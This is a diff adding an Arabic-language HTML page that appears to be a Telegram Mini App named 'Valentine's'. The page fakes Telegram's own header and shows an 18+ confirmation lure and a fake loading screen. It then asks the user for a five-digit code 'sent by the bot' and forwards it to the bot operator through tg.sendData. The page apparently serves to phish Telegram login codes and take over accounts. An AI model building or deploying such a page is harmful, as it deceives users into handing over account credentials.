@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Valentine's</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    html, body {
+      margin: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      background: #000;
+    }
+
+    .app {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      color: #111;
+    }
+
+    .bg {
+      position: absolute;
+      inset: 0;
+      background:
+        linear-gradient(rgba(255,255,255,.08), rgba(255,255,255,.08)),
+        url('https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=1200&auto=format&fit=crop') center/cover no-repeat;
+      filter: blur(10px) brightness(.75);
+      transform: scale(1.08);
+    }
+
+    .overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,.08);
+    }
+
+    .content {
+      position: relative;
+      z-index: 2;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 14px 14px 24px;
+    }
+
+    .header {
+      width: calc(100% + 28px);
+      margin: -14px -14px 0;
+      background: #fff;
+      padding: 16px 16px 12px;
+      border-bottom-left-radius: 0;
+      border-bottom-right-radius: 0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .header .side {
+      width: 70px;
+      font-size: 19px;
+      color: #168bf3;
+    }
+
+    .header .titlebox {
+      flex: 1;
+      text-align: center;
+    }
+
+    .header .title {
+      font-size: 26px;
+      font-weight: 700;
+      line-height: 1.1;
+    }
+
+    .header .subtitle {
+      margin-top: 2px;
+      font-size: 16px;
+      color: #757575;
+    }
+
+    .header .menu {
+      width: 70px;
+      text-align: right;
+      font-size: 32px;
+      color: #168bf3;
+      line-height: 1;
+    }
+
+    .spacer {
+      flex: 1;
+      width: 100%;
+    }
+
+    .hero {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 36px;
+    }
+
+    .hero-icon {
+      font-size: 120px;
+      line-height: 1;
+      margin-bottom: 18px;
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,.15));
+    }
+
+    .card {
+      width: 86%;
+      background: rgba(245,245,248,.92);
+      border-radius: 18px;
+      padding: 16px 18px;
+      text-align: center;
+      font-size: 20px;
+      line-height: 1.35;
+      box-shadow: 0 8px 20px rgba(0,0,0,.18);
+    }
+
+    .btn {
+      margin-top: 22px;
+      width: 86%;
+      border: 0;
+      border-radius: 16px;
+      background: #168bf3;
+      color: #fff;
+      font-size: 24px;
+      padding: 18px 16px;
+      box-shadow: 0 8px 18px rgba(0,0,0,.22);
+      cursor: pointer;
+    }
+
+    .btn:active {
+      transform: scale(.99);
+    }
+
+    .loading-wrap {
+      width: 100%;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      flex: 1;
+      gap: 28px;
+    }
+
+    .folder {
+      font-size: 110px;
+      line-height: 1;
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,.15));
+    }
+
+    .spinner {
+      width: 88px;
+      height: 88px;
+      border: 7px solid rgba(255,255,255,.35);
+      border-top-color: rgba(255,255,255,.8);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .code-wrap {
+      width: 100%;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 34px;
+      padding-bottom: 20px;
+    }
+
+    .phone {
+      font-size: 100px;
+      line-height: 1;
+      margin-bottom: 18px;
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,.15));
+    }
+
+    .code-card {
+      width: 86%;
+      background: rgba(245,245,248,.92);
+      border-radius: 18px;
+      padding: 18px;
+      text-align: center;
+      font-size: 20px;
+      line-height: 1.35;
+      box-shadow: 0 8px 20px rgba(0,0,0,.18);
+      margin-bottom: 18px;
+    }
+
+    .boxes {
+      width: 86%;
+      display: flex;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .box {
+      flex: 1;
+      height: 78px;
+      border-radius: 18px;
+      border: 4px solid rgba(255,255,255,.55);
+      background: rgba(255,255,255,.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 34px;
+      color: #fff;
+      font-weight: 700;
+      text-shadow: 0 2px 6px rgba(0,0,0,.25);
+    }
+
+    .small-btn {
+      width: 86%;
+      border: 0;
+      border-radius: 16px;
+      background: #168bf3;
+      color: #fff;
+      font-size: 22px;
+      padding: 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 8px 18px rgba(0,0,0,.22);
+      cursor: pointer;
+    }
+
+    .pad {
+      width: 86%;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 14px;
+    }
+
+    .key {
+      height: 78px;
+      border: 0;
+      border-radius: 16px;
+      background: #168bf3;
+      color: #fff;
+      font-size: 28px;
+      cursor: pointer;
+      box-shadow: 0 8px 18px rgba(0,0,0,.16);
+    }
+
+    .hidden {
+      visibility: hidden;
+    }
+
+    .status {
+      width: 86%;
+      margin-top: 12px;
+      text-align: center;
+      color: #fff;
+      font-size: 15px;
+      text-shadow: 0 1px 4px rgba(0,0,0,.35);
+      min-height: 22px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <div class="bg"></div>
+    <div class="overlay"></div>
+
+    <div class="content">
+      <div class="header">
+        <div class="side">إغلاق</div>
+        <div class="titlebox">
+          <div class="title">Valentine's</div>
+          <div class="subtitle">تطبيق مصغر</div>
+        </div>
+        <div class="menu">∘∘∘</div>
+      </div>
+
+      <div id="screen1" class="hero">
+        <div class="spacer"></div>
+        <div class="hero-icon">🔞</div>
+        <div class="card">
+          ⚠️ للتواصل، أكد أنك فوق 18 سنة وأنك تريد المتابعة 🙂
+        </div>
+        <button class="btn" onclick="goLoading()">🍓 تأكيد 18+</button>
+        <div class="spacer"></div>
+      </div>
+
+      <div id="screen2" class="loading-wrap">
+        <div class="folder">📂</div>
+        <div class="spinner"></div>
+      </div>
+
+      <div id="screen3" class="code-wrap">
+        <div class="phone">📱</div>
+        <div class="code-card">
+          أدخل رمز التأكيد المكوّن من 5 أرقام الذي أرسله لك البوت
+        </div>
+
+        <div class="boxes">
+          <div class="box" id="b0"></div>
+          <div class="box" id="b1"></div>
+          <div class="box" id="b2"></div>
+          <div class="box" id="b3"></div>
+          <div class="box" id="b4"></div>
+        </div>
+
+        <button class="small-btn" onclick="submitCode()">إرسال الرمز</button>
+
+        <div class="pad">
+          <button class="key" onclick="addDigit('1')">1</button>
+          <button class="key" onclick="addDigit('2')">2</button>
+          <button class="key" onclick="addDigit('3')">3</button>
+          <button class="key" onclick="addDigit('4')">4</button>
+          <button class="key" onclick="addDigit('5')">5</button>
+          <button class="key" onclick="addDigit('6')">6</button>
+          <button class="key" onclick="addDigit('7')">7</button>
+          <button class="key" onclick="addDigit('8')">8</button>
+          <button class="key" onclick="addDigit('9')">9</button>
+          <button class="key hidden">.</button>
+          <button class="key" onclick="addDigit('0')">0</button>
+          <button class="key" onclick="backspace()">⌫</button>
+        </div>
+
+        <div class="status" id="status"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    let code = "";
+
+    function show(id) {
+      document.getElementById("screen1").style.display = "none";
+      document.getElementById("screen2").style.display = "none";
+      document.getElementById("screen3").style.display = "none";
+      document.getElementById(id).style.display = id === "screen2" ? "flex" : "flex";
+    }
+
+    function goLoading() {
+      show("screen2");
+      setTimeout(() => {
+        show("screen3");
+        renderBoxes();
+      }, 1800);
+    }
+
+    function renderBoxes() {
+      for (let i = 0; i < 5; i++) {
+        document.getElementById("b" + i).textContent = code[i] || "";
+      }
+    }
+
+    function addDigit(d) {
+      if (code.length >= 5) return;
+      code += d;
+      renderBoxes();
+      setStatus("");
+    }
+
+    function backspace() {
+      code = code.slice(0, -1);
+      renderBoxes();
+      setStatus("");
+    }
+
+    function setStatus(text) {
+      document.getElementById("status").textContent = text;
+    }
+
+    function submitCode() {
+      if (code.length !== 5) {
+        setStatus("لازم تدخل 5 أرقام");
+        return;
+      }
+      tg.sendData(JSON.stringify({
+        action: "submit_code",
+        code: code
+      }));
+      setStatus("تم إرسال الرمز...");
+      setTimeout(() => tg.close(), 500);
+    }
+  </script>
+</body>
+</html>
